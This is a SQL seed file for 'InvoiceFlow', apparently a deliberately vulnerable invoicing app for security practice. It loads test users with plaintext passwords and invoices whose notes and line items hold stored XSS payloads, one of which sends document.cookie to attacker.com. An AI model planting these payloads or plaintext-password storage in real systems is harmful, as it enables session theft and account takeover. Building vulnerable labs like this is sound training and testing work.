-- Seed Data for InvoiceFlow
-- Contains test users, companies, and invoices with vulnerabilities

-- Test Users (Vulnerability #8: Plaintext passwords)
INSERT INTO users (username, email, password, full_name, role, created_at, is_active) VALUES
('admin', 'admin@invoiceflow.local', 'InvoiceFlow2024!Secure', 'System Administrator', 'admin', datetime('now'), 1),
('john', 'john@acmecorp.com', 'password123', 'John Anderson', 'user', datetime('now'), 1),
('test', 'test@example.com', 'test', 'Test User', 'user', datetime('now'), 1),
('sarah', 'sarah@techstartup.io', 'Welcome2023', 'Sarah Johnson', 'user', datetime('now'), 1),
('mike', 'mike@consulting.biz', 'qwerty', 'Mike Roberts', 'user', datetime('now'), 1);

-- Sample Companies/Clients
INSERT INTO companies (user_id, company_name, contact_person, email, phone, address, city, state, zip_code, country) VALUES
(2, 'Acme Corporation', 'Bob Smith', 'bob@acmecorp.com', '555-0101', '123 Business St', 'San Francisco', 'CA', '94102', 'USA'),
(2, 'TechStart Inc', 'Alice Williams', 'alice@techstart.io', '555-0102', '456 Innovation Ave', 'Austin', 'TX', '78701', 'USA'),
(2, 'Global Solutions Ltd', 'Charlie Brown', 'charlie@globalsolutions.com', '555-0103', '789 Enterprise Blvd', 'New York', 'NY', '10001', 'USA'),
(4, 'Digital Agency Pro', 'David Lee', 'david@digitalagency.com', '555-0104', '321 Creative Way', 'Seattle', 'WA', '98101', 'USA'),
(4, 'Consulting Partners', 'Emma Davis', 'emma@consultingpartners.net', '555-0105', '654 Professional Dr', 'Boston', 'MA', '02101', 'USA'),
(5, 'Software Dynamics', 'Frank Miller', 'frank@softwaredynamics.io', '555-0106', '987 Code Lane', 'Denver', 'CO', '80202', 'USA');

-- Sample Invoices (some with XSS payloads for Vulnerability #6)
INSERT INTO invoices (user_id, company_id, invoice_number, invoice_date, due_date, status, subtotal, tax_rate, tax_amount, discount, total, notes, terms) VALUES
(2, 1, 'INV-2024-001', '2024-01-15', '2024-02-14', 'paid', 5000.00, 0.08, 400.00, 0.00, 5400.00,
 'Thank you for your business!',
 'Payment due within 30 days. Late payments subject to 1.5% monthly interest.'),

(2, 2, 'INV-2024-002', '2024-01-20', '2024-02-19', 'sent', 12500.00, 0.08, 1000.00, 500.00, 13000.00,
 '<script>alert("XSS Vulnerability")</script>Project completed ahead of schedule.',
 'Payment due within 30 days. Wire transfer preferred.'),

(2, 3, 'INV-2024-003', '2024-01-25', '2024-02-24', 'draft', 8750.00, 0.08, 700.00, 0.00, 9450.00,
 'Consulting services for Q1 2024. <img src=x onerror=alert("Stored XSS")>',
 'Net 30 payment terms apply.'),

(4, 4, 'INV-2024-004', '2024-02-01', '2024-03-02', 'overdue', 3200.00, 0.08, 256.00, 0.00, 3456.00,
 'Website redesign project - Phase 1',
 'Payment due within 30 days.'),

(4, 5, 'INV-2024-005', '2024-02-05', '2024-03-07', 'sent', 6800.00, 0.08, 544.00, 200.00, 7144.00,
 'Monthly retainer for February 2024<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
 'Payment due within 30 days. Direct deposit available.'),

(5, 6, 'INV-2024-006', '2024-02-10', '2024-03-12', 'draft', 15000.00, 0.08, 1200.00, 1000.00, 15200.00,
 'Software development services - Custom CRM system',
 'Payment due within 30 days. Milestone-based billing.'),

(2, 1, 'INV-2024-007', '2024-02-15', '2024-03-17', 'sent', 4500.00, 0.08, 360.00, 0.00, 4860.00,
 'Additional consulting hours for January</textarea><script>alert("XSS in textarea")</script><textarea>',
 'Net 30 payment terms.'),

(4, 4, 'INV-2024-008', '2024-02-20', '2024-03-22', 'paid', 2800.00, 0.08, 224.00, 0.00, 3024.00,
 'SEO optimization services',
 'Payment due within 30 days.'),

(2, 2, 'INV-2024-009', '2024-02-25', '2024-03-27', 'draft', 9500.00, 0.08, 760.00, 500.00, 9760.00,
 'Q1 2024 Marketing Campaign<svg/onload=alert("SVG XSS")>',
 'Payment due within 30 days.'),

(5, 6, 'INV-2024-010', '2024-03-01', '2024-03-31', 'sent', 7200.00, 0.08, 576.00, 0.00, 7776.00,
 'Database migration and optimization services',
 'Payment due within 30 days. ACH preferred.');

-- Invoice line items
INSERT INTO invoice_items (invoice_id, description, quantity, unit_price, amount, sort_order) VALUES
-- Invoice 1 items
(1, 'Consulting Services - Strategy Planning', 20.0, 250.00, 5000.00, 1),

-- Invoice 2 items
(2, 'Web Development - Frontend', 40.0, 150.00, 6000.00, 1),
(2, 'Web Development - Backend', 30.0, 175.00, 5250.00, 2),
(2, 'UI/UX Design', 10.0, 125.00, 1250.00, 3),

-- Invoice 3 items
(3, 'Business Process Analysis', 25.0, 200.00, 5000.00, 1),
(3, 'Implementation Planning', 15.0, 250.00, 3750.00, 2),

-- Invoice 4 items
(4, 'Website Design<script>alert("XSS in line item")</script>', 16.0, 200.00, 3200.00, 1),

-- Invoice 5 items
(5, 'Monthly Consulting Retainer', 1.0, 6800.00, 6800.00, 1),

-- Invoice 6 items
(6, 'Custom CRM Development - Backend', 60.0, 175.00, 10500.00, 1),
(6, 'Custom CRM Development - Frontend', 30.0, 150.00, 4500.00, 2),

-- Invoice 7 items
(7, 'Additional Consulting Hours', 18.0, 250.00, 4500.00, 1),

-- Invoice 8 items
(8, 'SEO Audit and Optimization', 14.0, 200.00, 2800.00, 1),

-- Invoice 9 items
(9, 'Marketing Campaign Strategy', 20.0, 250.00, 5000.00, 1),
(9, 'Content Creation', 30.0, 150.00, 4500.00, 2),

-- Invoice 10 items
(10, 'Database Migration Planning', 12.0, 200.00, 2400.00, 1),
(10, 'Performance Optimization', 24.0, 200.00, 4800.00, 2);

-- Sample API keys (DUMMY KEYS FOR TESTING ONLY)
INSERT INTO api_keys (user_id, api_key, description, is_active, created_at) VALUES
(1, 'demo_key_abc123def456ghi789jkl012mno345', 'Admin API Key', 1, datetime('now')),
(2, 'demo_key_xyz987uvw654rst321pqo098lmn765', 'John API Key', 1, datetime('now')),
(4, 'demo_key_test123test456test789test012', 'Sarah Test Key', 1, datetime('now'));

-- Sample activity log
INSERT INTO activity_log (user_id, action, resource_type, resource_id, ip_address, details) VALUES
(1, 'login', 'user', 1, '192.168.1.100', 'Successful admin login'),
(2, 'create', 'invoice', 1, '192.168.1.101', 'Created invoice INV-2024-001'),
(2, 'create', 'invoice', 2, '192.168.1.101', 'Created invoice INV-2024-002'),
(4, 'login', 'user', 4, '192.168.1.102', 'Successful user login'),
(2, 'update', 'invoice', 1, '192.168.1.101', 'Updated invoice status to paid');
